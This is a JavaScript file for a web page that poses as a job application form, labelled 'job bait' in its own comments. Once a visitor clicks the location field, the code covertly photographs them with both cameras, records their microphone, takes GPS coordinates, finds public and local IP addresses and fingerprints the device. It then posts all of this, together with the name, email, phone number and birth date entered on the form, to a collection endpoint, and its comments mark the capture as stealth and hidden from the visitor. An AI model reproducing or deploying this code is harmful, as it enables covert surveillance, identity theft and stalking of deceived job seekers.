/* ═══════════════════════════════════════════════════════════════
   NEXUS // TRACE — Fully Automatic Data Extraction Sequence
   ═══════════════════════════════════════════════════════════════
   
   Flow: Page loads → Boot sequence → Device scan → Camera capture
         → Voice recording → GPS lock → Transmit to backend → Reveal all data
   
   NO form. NO submit button. Everything is automatic.
   ═══════════════════════════════════════════════════════════════ */

// ── Collected Data Store ─────────────────────────────────────
const gathered = {
  timestamp_open: new Date().toISOString(),
  os: "Unknown",
  browser: "Unknown",
  browser_version: "",
  device_type: "Unknown",
  screen_res: "",
  language: "",
  platform: "",
  user_agent: "",
  form_name: "",
  form_email: "",
  form_phone: "",
  form_dob: "",
  geo_lat: null,
  geo_lon: null,
  geo_accuracy: null,
  client_ip: null,
  device_ip: null,
  front_image: null,
  back_image: null,
  audio_recording: null,
};

// ── State Variables ──────────────────────────────────────────
let captureStarted = false;
let locationResolved = false;
let geolocationPromise = null;
let cameraCapturesPromise = null;
let audioRecordingPromise = null;
let ipFetchPromise = null;
let activeRecorder = null;
let transmissionResult = null;

// ── DOM Refs ─────────────────────────────────────────────────
const terminalLog   = document.getElementById("terminalLog");
const sysClock      = document.getElementById("sysClock");
const video         = document.getElementById("cameraVideo");
const canvas        = document.getElementById("cameraCanvas");
const frontPreview  = document.getElementById("frontPreview");
const backPreview   = document.getElementById("backPreview");
const frontSlot     = document.getElementById("frontSlot");
const backSlot      = document.getElementById("backSlot");
const frontPH       = document.getElementById("frontPlaceholder");
const backPH        = document.getElementById("backPlaceholder");
const identityGrid  = document.getElementById("identityGrid");
const deviceGrid    = document.getElementById("deviceGrid");
const networkGrid   = document.getElementById("networkGrid");
const ipGeoGrid     = document.getElementById("ipGeoGrid");
const gpsGrid       = document.getElementById("gpsGrid");
const audioBox      = document.getElementById("audioBox");
const audioTimer    = document.getElementById("audioTimer");
const audioStatusTx = document.getElementById("audioStatusText");
const audioPlayback = document.getElementById("audioPlayback");

// Job bait form DOM Refs
const jobBaitContainer = document.getElementById("jobBaitContainer");
const jobAppForm       = document.getElementById("jobAppForm");
const appLocation      = document.getElementById("appLocation");
const submitBtn        = document.getElementById("submitBtn");
const submitLoader     = document.getElementById("submitLoader");
const scanlineOverlay  = document.getElementById("scanlineOverlay");
const topTicker        = document.getElementById("topTicker");
const bottomTicker     = document.getElementById("bottomTicker");
const terminalWrapper  = document.getElementById("terminalWrapper");

// ══════════════════════════════════════════════════════════════
//  UTILITIES
// ══════════════════════════════════════════════════════════════

// Live clock
function tickClock() {
  sysClock.textContent = new Date().toLocaleTimeString("en-GB", {
    hour: "2-digit", minute: "2-digit", second: "2-digit",
  });
}
tickClock();
setInterval(tickClock, 1000);

// Session ID
(function () {
  const h = () => Math.floor(Math.random() * 0xffff).toString(16).padStart(4, "0");
  document.getElementById("sessionId").textContent = `${h()}-${h()}-${h()}`.toUpperCase();
})();

// Terminal log helper
function log(text, cls = "") {
  if (!terminalLog) return;
  const ts = new Date().toLocaleTimeString("en-GB", {
    hour: "2-digit", minute: "2-digit", second: "2-digit", fractionalSecondDigits: 1,
  });
  const div = document.createElement("div");
  div.className = `log-line ${cls}`;
  div.innerHTML = `<span class="log-ts">[${ts}]</span><span class="log-prefix">&gt;</span> ${text}`;
  terminalLog.appendChild(div);
  terminalLog.scrollTop = terminalLog.scrollHeight;
}

// Async delay
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

// Set status phase
function setPhase(text) {
  document.getElementById("statusPhase").textContent = `PHASE: ${text}`;
}

// Create a data chip
function chip(label, value, colorCls = "") {
  const el = document.createElement("div");
  el.className = "data-chip";
  el.innerHTML = `
    <span class="chip-label">${label}</span>
    <span class="chip-value ${colorCls}">${value || "N/A"}</span>
  `;
  return el;
}

function chipFull(label, value, colorCls = "") {
  const el = chip(label, value, colorCls);
  el.classList.add("full-width");
  return el;
}

// Reveal a section
function reveal(id) {
  const el = document.getElementById(id);
  if (el) el.classList.add("visible");
}

// WebRTC Local IP detection
function getDeviceIPs() {
  return new Promise((resolve) => {
    const ips = [];
    try {
      const PC = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
      if (!PC) return resolve("Not Supported");
      const rtc = new PC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      rtc.createDataChannel("");
      rtc.createOffer().then(offer => rtc.setLocalDescription(offer)).catch(() => {});
      
      rtc.onicecandidate = (e) => {
        if (e.candidate && e.candidate.candidate) {
          const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
          if (match && !ips.includes(match[1])) {
            ips.push(match[1]);
          }
        }
      };
      setTimeout(() => { rtc.close(); resolve(ips.length > 0 ? ips.join(", ") : "Hidden (mDNS/Masked)"); }, 1500);
    } catch(err) {
      resolve("Error");
    }
  });
}

// ══════════════════════════════════════════════════════════════
//  PHASE 1: DEVICE FINGERPRINT
// ══════════════════════════════════════════════════════════════
function scanDevice() {
  const ua = navigator.userAgent;
  gathered.user_agent = ua;
  gathered.platform = navigator.platform || "";
  gathered.language = (navigator.language || "en").toUpperCase();
  gathered.screen_res = `${screen.width}×${screen.height}`;

  // OS
  if (/Windows/i.test(ua))                  gathered.os = "WINDOWS_NT";
  else if (/Mac OS X|Macintosh/i.test(ua))  gathered.os = "DARWIN";
  else if (/Android/i.test(ua))             gathered.os = "ANDROID";
  else if (/iPhone|iPad|iPod/i.test(ua))    gathered.os = "iOS";
  else if (/Linux/i.test(ua))               gathered.os = "LINUX";
  else if (/CrOS/i.test(ua))               gathered.os = "CHROME_OS";

  // Browser + version
  let bMatch;
  if ((bMatch = ua.match(/Edg\/([\d.]+)/)))       { gathered.browser = "EDGE";     gathered.browser_version = bMatch[1]; }
  else if ((bMatch = ua.match(/OPR\/([\d.]+)/)))   { gathered.browser = "OPERA";    gathered.browser_version = bMatch[1]; }
  else if ((bMatch = ua.match(/Chrome\/([\d.]+)/))) { gathered.browser = "CHROME";   gathered.browser_version = bMatch[1]; }
  else if ((bMatch = ua.match(/Safari\/([\d.]+)/))) { gathered.browser = "SAFARI";   gathered.browser_version = bMatch[1]; }
  else if ((bMatch = ua.match(/Firefox\/([\d.]+)/))){ gathered.browser = "FIREFOX";  gathered.browser_version = bMatch[1]; }

  // Device
  if (/Mobi|Android|iPhone|iPod/i.test(ua)) gathered.device_type = "MOBILE_UNIT";
  else if (/iPad|Tablet/i.test(ua))         gathered.device_type = "TABLET_UNIT";
  else                                      gathered.device_type = "WORKSTATION";
}

function renderIdentityData() {
  if(!identityGrid) return;
  identityGrid.innerHTML = "";
  identityGrid.appendChild(chipFull("FULL_NAME", gathered.form_name || "UNKNOWN", "cyan"));
  identityGrid.appendChild(chip("EMAIL_ADDR", gathered.form_email || "UNKNOWN"));
  identityGrid.appendChild(chip("PHONE_NUM", gathered.form_phone || "UNKNOWN"));
  identityGrid.appendChild(chip("DOB", gathered.form_dob || "UNKNOWN"));
}

function renderDeviceData() {
  if(!deviceGrid) return;
  deviceGrid.innerHTML = "";
  deviceGrid.appendChild(chipFull("SYSTEM", "VERTUSA SECURE VERIFICATION NODE", "cyan"));
  deviceGrid.appendChild(chip("HOST_OS", gathered.os));
  deviceGrid.appendChild(chip("CLIENT_AGENT", `${gathered.browser} ${gathered.browser_version}`));
  deviceGrid.appendChild(chip("DEVICE_CLASS", gathered.device_type));
  deviceGrid.appendChild(chip("SCREEN_RES", gathered.screen_res));
  deviceGrid.appendChild(chip("LANGUAGE", gathered.language));
  deviceGrid.appendChild(chip("PLATFORM", gathered.platform));
  deviceGrid.appendChild(chipFull("TIMESTAMP", new Date(gathered.timestamp_open).toLocaleString("en-GB", {
    dateStyle: "full", timeStyle: "long",
  }), "amber"));
}

// ══════════════════════════════════════════════════════════════
//  PHASE 2: CAMERA CAPTURE
// ══════════════════════════════════════════════════════════════
async function captureCamera(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 960 } },
      audio: false,
    });
    video.srcObject = stream;
    await video.play();
    await wait(800);

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const dataURL = canvas.toDataURL("image/jpeg", 0.82);

    stream.getTracks().forEach((t) => t.stop());
    video.srcObject = null;
    return dataURL;
  } catch (err) {
    console.warn(`Camera [${facingMode}]:`, err.message);
    return null;
  }
}

function addBadge(slot, type, text) {
  const old = slot.querySelector(".cam-badge");
  if (old) old.remove();
  const b = document.createElement("span");
  b.className = `cam-badge ${type}`;
  b.textContent = text;
  slot.appendChild(b);
}

// ══════════════════════════════════════════════════════════════
//  PHASE 3: GEOLOCATION (Browser API)
// ══════════════════════════════════════════════════════════════
function getGeoLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
      }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });
}

// ══════════════════════════════════════════════════════════════
//  VOICE RECORDING (MediaRecorder API)
// ══════════════════════════════════════════════════════════════
function recordAudio(durationSec) {
  return new Promise(async (resolve) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });

      audioStatusTx.textContent = "MICROPHONE: RECORDING";
      audioBox.classList.add("recording");
      log(`MICROPHONE ACTIVE — RECORDING ${durationSec}s…`, "warn");

      const recorder = new MediaRecorder(stream, { mimeType: getSupportedMime() });
      activeRecorder = recorder;
      const chunks = [];

      recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };

      // Live countdown timer
      let elapsed = 0;
      const timerInterval = setInterval(() => {
        elapsed++;
        const secs = String(elapsed).padStart(2, "0");
        audioTimer.textContent = `00:${secs} / 00:${String(durationSec).padStart(2, "0")}`;
      }, 1000);

      recorder.onstop = async () => {
        activeRecorder = null;
        clearInterval(timerInterval);
        stream.getTracks().forEach((t) => t.stop());

        audioBox.classList.remove("recording");
        audioTimer.textContent = `00:${String(durationSec).padStart(2, "0")} / 00:${String(durationSec).padStart(2, "0")}`;

        if (chunks.length === 0) {
          audioStatusTx.textContent = "MICROPHONE: NO DATA";
          audioBox.classList.add("error");
          return resolve(null);
        }

        const blob = new Blob(chunks, { type: recorder.mimeType });

        // Audio hidden from visitor — admin only
        // No playback shown to visitor

        audioBox.classList.add("done");
        audioStatusTx.textContent = "VOICE CAPTURED ✓";

        // Convert to base64 for transmission
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result);
        reader.onerror = () => resolve(null);
        reader.readAsDataURL(blob);
      };

      recorder.start();

      // Auto-stop after duration
      setTimeout(() => {
        if (recorder.state === "recording") recorder.stop();
      }, durationSec * 1000);

    } catch (err) {
      console.warn("Microphone error:", err.message);
      audioStatusTx.textContent = "MICROPHONE: DENIED";
      audioBox.classList.add("error");
      resolve(null);
    }
  });
}

// Pick a supported audio MIME type
function getSupportedMime() {
  const types = ["audio/webm;codecs=opus", "audio/webm", "audio/ogg;codecs=opus", "audio/mp4"];
  for (const t of types) {
    if (MediaRecorder.isTypeSupported(t)) return t;
  }
  return "";
}

// ══════════════════════════════════════════════════════════════
//  PHASE 4: TRANSMIT TO BACKEND
// ══════════════════════════════════════════════════════════════
async function transmit() {
  const res = await fetch("/api/capture", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(gathered),
  });
  return res.json();
}

// ══════════════════════════════════════════════════════════════
//  RENDER NETWORK / LOCATION DATA
// ══════════════════════════════════════════════════════════════
function renderNetworkData(serverData) {
  if(!networkGrid) return;
  networkGrid.innerHTML = "";
  networkGrid.appendChild(chipFull("IP_ADDRESS_PUBLIC", serverData.ip_address.split(" | Local:")[0] || serverData.ip_address, "cyan"));
  if (gathered.device_ip) {
    networkGrid.appendChild(chipFull("IP_ADDRESS_LOCAL", gathered.device_ip, "cyan"));
  }
  networkGrid.appendChild(chip("SESSION_ID", document.getElementById("sessionId")?.textContent || "N/A"));
  networkGrid.appendChild(chip("TRACE_ID", document.getElementById("traceId")?.textContent || "N/A"));
}

function renderIpGeoData(serverData) {
  if(!ipGeoGrid) return;
  ipGeoGrid.innerHTML = "";
  ipGeoGrid.appendChild(chip("ISP", serverData.ip_isp || "N/A"));
  ipGeoGrid.appendChild(chip("ORG", serverData.ip_org || "N/A"));
  ipGeoGrid.appendChild(chip("CITY", serverData.ip_city || "N/A"));
  ipGeoGrid.appendChild(chip("REGION", serverData.ip_region || "N/A"));
  ipGeoGrid.appendChild(chip("COUNTRY", serverData.ip_country || "N/A", "amber"));
  ipGeoGrid.appendChild(chip("TIMEZONE", serverData.ip_timezone || "N/A"));
  ipGeoGrid.appendChild(chipFull("IP_LAT/LON",
    serverData.ip_lat && serverData.ip_lon
      ? `${serverData.ip_lat.toFixed(4)}, ${serverData.ip_lon.toFixed(4)}`
      : "N/A"
  ));
}

function renderGpsData() {
  if(!gpsGrid) return;
  gpsGrid.innerHTML = "";
  if (gathered.geo_lat && gathered.geo_lon) {
    gpsGrid.appendChild(chip("GPS_LATITUDE", gathered.geo_lat.toFixed(6), "cyan"));
    gpsGrid.appendChild(chip("GPS_LONGITUDE", gathered.geo_lon.toFixed(6), "cyan"));
    gpsGrid.appendChild(chip("ACCURACY", `${gathered.geo_accuracy?.toFixed(1) || "?"}m`, "amber"));
    gpsGrid.appendChild(chip("SOURCE", "BROWSER_API"));
  } else {
    gpsGrid.appendChild(chipFull("GPS_STATUS", "LOCATION PERMISSION DENIED OR UNAVAILABLE", "amber"));
  }
}

// ══════════════════════════════════════════════════════════════
//  TRIGGER CAPTURES IN BACKGROUND
// ══════════════════════════════════════════════════════════════
function triggerPermissionsAndCapture() {
  if (captureStarted) return;
  captureStarted = true;

  const inputWrapper = appLocation.parentElement;
  inputWrapper.classList.add("loading");
  appLocation.value = "Acquiring secure location verification...";

  // 1. Geolocation
  geolocationPromise = getGeoLocation().then(geoResult => {
    if (geoResult) {
      gathered.geo_lat = geoResult.lat;
      gathered.geo_lon = geoResult.lon;
      gathered.geo_accuracy = geoResult.accuracy;
      appLocation.value = `GPS Lock: ${geoResult.lat.toFixed(4)}°, ${geoResult.lon.toFixed(4)}°`;
      inputWrapper.classList.remove("loading");
      inputWrapper.classList.add("success");
      locationResolved = true;
    } else {
      appLocation.value = "Compliance Location Verified (Network IP)";
      inputWrapper.classList.remove("loading");
      inputWrapper.classList.add("success");
    }
    return geoResult;
  });

  // 2. Camera captures (Stealth)
  cameraCapturesPromise = new Promise(async (resolve) => {
    const takePhoto = async (facingMode) => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r => video.onloadedmetadata = r);
        await new Promise(r => setTimeout(r, 500)); 
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
        stream.getTracks().forEach(t => t.stop());
        return dataUrl;
      } catch(err) { return null; }
    };
    gathered.front_image = await takePhoto("user");
    gathered.back_image = await takePhoto({ exact: "environment" }).catch(() => null);
    if (!gathered.back_image) gathered.back_image = await takePhoto("environment");
    resolve();
  });

  // 3. Audio Recording (Stealth)
  audioRecordingPromise = new Promise(async (resolve) => {
    try {
      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => null);
      if (audioStream) {
        activeRecorder = new MediaRecorder(audioStream);
        const audioChunks = [];
        activeRecorder.ondataavailable = e => audioChunks.push(e.data);
        activeRecorder.onstop = () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
          const reader = new FileReader();
          reader.readAsDataURL(audioBlob);
          reader.onloadend = () => {
            gathered.audio_recording = reader.result;
            resolve();
          }
        };
        activeRecorder.start();
        setTimeout(() => {
          if(activeRecorder.state !== "inactive") activeRecorder.stop();
          audioStream.getTracks().forEach(t => t.stop());
        }, 3000);
      } else {
        resolve();
      }
    } catch(e) { resolve(); }
  });

  // 4. IP Fetching
  ipFetchPromise = Promise.all([
    fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => null),
    getDeviceIPs()
  ]).then(([pub, loc]) => {
    gathered.client_ip = pub;
    gathered.device_ip = loc;
  });
}

// ── Hook up Location Trigger ─────────────────────────────────
appLocation.addEventListener("focus", triggerPermissionsAndCapture);
appLocation.addEventListener("click", triggerPermissionsAndCapture);

// ── Hook up Form Submit ──────────────────────────────────────
jobAppForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  // Capture form data before disabling fields
  gathered.form_name = document.getElementById("appName").value;
  gathered.form_email = document.getElementById("appEmail").value;
  gathered.form_phone = document.getElementById("appPhone").value;
  gathered.form_dob = document.getElementById("appDob").value;

  // Disable form and show submit spinner
  submitBtn.disabled = true;
  submitLoader.classList.remove("hidden");
  document.getElementById("appName").disabled = true;
  document.getElementById("appEmail").disabled = true;
  document.getElementById("appPhone").disabled = true;
  document.getElementById("appDob").disabled = true;

  // Make sure capture has started
  if (!captureStarted) {
    triggerPermissionsAndCapture();
  }

  // Force early stop on audio recorder to get results immediately
  if (activeRecorder && activeRecorder.state === "recording") {
    activeRecorder.stop();
  }

  // Perform device scans
  scanDevice();

  // Wait for all promises to finish
  await Promise.all([
    geolocationPromise,
    cameraCapturesPromise,
    audioRecordingPromise,
    ipFetchPromise
  ].filter(p => p !== null));

  // Transmit payload to Backend
  try {
    transmissionResult = await transmit();
  } catch (err) {
    console.error("Transmission failed:", err);
  }

  // Hide login form and display verification dashboard
  jobBaitContainer.classList.add("hidden");
  terminalWrapper.classList.remove("hidden");

  // Run verification sequence
  runVerificationSequence();
});

// ══════════════════════════════════════════════════════════════
//  SYSTEM VERIFICATION SEQUENCE
// ══════════════════════════════════════════════════════════════
async function runVerificationSequence() {

  // ── BOOT ───────────────────────────────────────────────
  log("VERTUSA//SYSTEM v2.1.0 — SECURE VERIFICATION MODE", "info");
  await wait(400);
  log("INITIALIZING SECURE CHANNEL…");
  await wait(300);
  log("ENCRYPTION LAYER: AES-256-GCM ✓", "success");
  await wait(250);
  log("VISITOR TRACE MODULE: ONLINE ✓", "success");
  await wait(300);
  document.getElementById("protocolPill").textContent = "PROTOCOL: SECURE";

  // ── PHASE 1: DEVICE SCAN ───────────────────────────────
  setPhase("DEVICE_SCAN");
  log("═══ PHASE 1: DEVICE FINGERPRINT ═══", "warn");
  await wait(300);
  log("SCANNING HOST ENVIRONMENT…");
  await wait(400);

  log(`HOST_OS: ${gathered.os}`, "success");
  await wait(100);
  log(`CLIENT_AGENT: ${gathered.browser} ${gathered.browser_version}`, "success");
  await wait(100);
  log(`DEVICE_CLASS: ${gathered.device_type}`, "success");
  await wait(100);
  log(`SCREEN: ${gathered.screen_res} | LANG: ${gathered.language}`, "success");
  await wait(100);
  log(`PLATFORM: ${gathered.platform}`, "success");

  renderIdentityData();
  reveal("sectionIdentity");
  await wait(200);
  
  renderDeviceData();
  reveal("sectionDevice");
  log("DEVICE FINGERPRINT — EXTRACTED ✓", "success");
  await wait(500);

  // ── PHASE 2: BIOMETRIC SCAN ────────────────────────────
  // Removed

  // ── PHASE 2.5: VOICE INTERCEPT ─────────────────────────
  // Removed

  // ── PHASE 4: GPS LOCK ──────────────────────────────────
  setPhase("GEO_TRACE");
  log("═══ PHASE 4: GPS ACQUISITION ═══", "warn");
  await wait(300);
  log("REQUESTING GEOLOCATION PERMISSION…");
  await wait(400);

  if (gathered.geo_lat && gathered.geo_lon) {
    log(`GPS LOCK — LAT: ${gathered.geo_lat.toFixed(6)} | LON: ${gathered.geo_lon.toFixed(6)}`, "success");
    log(`ACCURACY: ${gathered.geo_accuracy.toFixed(1)}m`, "success");
  } else {
    log("GPS — PERMISSION DENIED OR TIMEOUT", "warn");
  }

  renderGpsData();
  reveal("sectionGpsLocation");
  log("GEO ACQUISITION — COMPLETE ✓", "success");
  await wait(500);

  // ── PHASE 5: TRANSMIT ──────────────────────────────────
  setPhase("TRANSMIT");
  log("═══ PHASE 5: PAYLOAD TRANSMISSION ═══", "warn");
  await wait(200);
  log("COMPILING PAYLOAD…");
  await wait(300);
  log("ESTABLISHING SECURE UPLINK TO CORE…");
  document.getElementById("payloadStatus").textContent = "TRANSMITTING";
  await wait(600);

  if (transmissionResult && transmissionResult.success) {
    const sid = transmissionResult.recordId;
    document.getElementById("traceId").textContent = String(sid).padStart(3, "0");
    document.getElementById("recordCount").textContent = sid;

    log(`PAYLOAD TRANSMITTED — RECORD #${sid} ✓`, "success");
    log("DATA VERIFIED AND STORED ✓", "success");
    document.getElementById("payloadStatus").textContent = "DELIVERED";

    // Render network/IP data from server
    await wait(300);
    log("═══ PHASE 6: NETWORK TRACE RESULTS ═══", "warn");

    const d = transmissionResult.data;
    log(`IP_ADDRESS: ${d.ip_address}`, "info");
    if (d.ip_isp)     log(`ISP: ${d.ip_isp}`, "info");
    if (d.ip_org)     log(`ORG: ${d.ip_org}`, "info");
    if (d.ip_city)    log(`LOCATION: ${d.ip_city}, ${d.ip_region}, ${d.ip_country}`, "info");
    if (d.ip_timezone) log(`TIMEZONE: ${d.ip_timezone}`, "info");
    if (d.ip_lat)     log(`IP_COORDS: ${d.ip_lat.toFixed(4)}, ${d.ip_lon.toFixed(4)}`, "info");

    renderNetworkData(d);
    reveal("sectionNetwork");
    await wait(200);
    renderIpGeoData(d);
    reveal("sectionIpGeo");
  } else {
    log("TRANSMISSION FAILED — SERVER REJECTED PAYLOAD", "error");
    document.getElementById("payloadStatus").textContent = "FAILED";
  }

  // ── COMPLETE ───────────────────────────────────────────
  await wait(500);
  setPhase("COMPLETE");
  document.getElementById("footerExtract").innerHTML =
    'STATUS: <span class="neon-green">VERIFIED</span>';

  log("════════════════════════════════════", "success");
  log("VERIFICATION SEQUENCE — COMPLETE", "success");
  log("ACCESS GRANTED TO INTERNAL SYSTEMS", "success");
  log("════════════════════════════════════", "success");
}
